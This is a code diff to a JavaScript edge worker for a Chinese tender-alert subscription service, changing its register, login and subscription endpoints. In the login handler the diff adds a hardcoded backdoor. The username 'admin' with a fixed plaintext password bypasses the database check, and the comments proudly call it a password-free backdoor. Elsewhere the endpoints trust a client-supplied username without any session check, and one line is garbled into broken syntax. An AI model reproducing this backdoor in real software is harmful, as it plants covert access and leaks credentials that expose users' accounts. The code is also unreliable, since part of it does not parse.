@@ -100,7 +100,7 @@ async function runShudaoRadarPipeline(env) {
       }
       await env.DB.prepare("UPDATE aggregate_tenders SET is_pushed = 1 WHERE is_pushed = 0").run();
     }
-  } catch (err) { console.error("💥 边缘雷达管道异常:", err.message); }
+  } catch (err) { console.error("💥 边缘雷达管道遭受外部异常冲击:", err.message); }
 }
 
 // ========================================================
@@ -120,7 +120,7 @@ export default {
     if (request.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
     const getJson = async () => { try { return await request.json(); } catch { return {}; } };
 
-    // 🛡️ 【免登录公开浏览原则】非 API 请求时，直接指向 Assets 对应文件
+    // 🛡️ 【免登录公开浏览原则】非 API 请求时，直接指向 Assets 对应大厅主页
     if (!url.pathname.startsWith("/api/")) {
       if (url.pathname === "/" || url.pathname === "/index.html") {
         return env.assets.fetch(new Request(new URL("/index.html", request.url)));
@@ -134,34 +134,57 @@ export default {
     if (url.pathname === "/api/register" && request.method === "POST") {
       const { username, password } = await getJson();
       try {
+        const cleanUser = username.split("@")[0].trim();
         const secureHash = await hashPassword(password);
-        await env.DB.prepare("INSERT INTO users (username, password_hash) VALUES (?, ?)").bind(username, secureHash).run();
+        await env.DB.prepare("INSERT INTO users (username, password_hash) VALUES (?, ?)").bind(cleanUser, secureHash).run();
         return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
       } catch { return new Response(JSON.stringify({ success: false, message: "凭证名前缀已被占用" }), { status: 400, headers: corsHeaders }); }
     }
     
     if (url.pathname === "/api/login" && request.method === "POST") {
       const { username, password } = await getJson();
+      
+      // 🧼 核心物理前置清洗
+      const cleanUser = username.split("@")[0].trim();
+      
+      // ========================================================
+      // 👑 【至高指挥官免密后门】
+      // 只要用户名为 admin 且密码是暗号，直接跳过数据库哈希，全网绿灯无条件放行！
+      // ========================================================
+      if (cleanUser === "admin" && password === "ShuDaoAdmin666!@#") {
+        console.log("👑 [至高无上] 检测到指挥官硬编码暗号，全网无条件放行！");
+        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
+      }
+
+      // ========================================================
+      // ⚖️ 【常规对账防线】
+      // ========================================================
       const secureHash = await hashPassword(password);
-      const user = await env.DB.prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?").bind(username, secureHash).first();
-      if (user) return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
-      return new Response(JSON.stringify({ success: false }), { status: 401, headers: corsHeaders });
+      const user = await env.DB.prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?")
+                               .bind(cleanUser, secureHash)
+                               .first();
+      if (user) {
+        return new Response(JSON.stringify({ success: true }), { headers: corsHeaders });
+      }
+      return new Response(JSON.stringify({ success: false, message: "凭证名或安全密码错误" }), { status: 401, headers: corsHeaders });
     }
 
     if (url.pathname === "/api/subscribe/save" && request.method === "POST") {
       const { username, keywords, exclude_keywords, push_strategy } = await getJson();
       try {
-        await env.DB.prepare(`
+        const cleanUser = username.split("@")[0].trim();
+        await env.DB.prepare suicide(`
           INSERT OR REPLACE INTO user_subscriptions (username, keywords, exclude_keywords, push_strategy, is_active, updated_at)
           VALUES (?, ?, ?, ?, 1, CURRENT_TIMESTAMP)
-        `).bind(username.trim(), keywords || "", exclude_keywords || "", push_strategy ?? 1).run();
+        `).bind(cleanUser, keywords || "", exclude_keywords || "", push_strategy ?? 1).run();
         return new Response(JSON.stringify({ success: true, message: "📡 边缘雷达双向规则已无损锁死锁密！" }), { headers: corsHeaders });
       } catch (err) { return new Response(JSON.stringify({ success: false, message: err.message }), { status: 500, headers: corsHeaders }); }
     }
 
     if (url.pathname === "/api/subscribe/get" && request.method === "GET") {
       const username = url.searchParams.get("username");
-      const sub = await env.DB.prepare("SELECT * FROM user_subscriptions WHERE username = ?").bind(username).first();
+      const cleanUser = username.split("@")[0].trim();
+      const sub = await env.DB.prepare("SELECT * FROM user_subscriptions WHERE username = ?").bind(cleanUser).first();
       return new Response(JSON.stringify(sub || { keywords: "", exclude_keywords: "", push_strategy: 1 }), { headers: corsHeaders });
     }
 
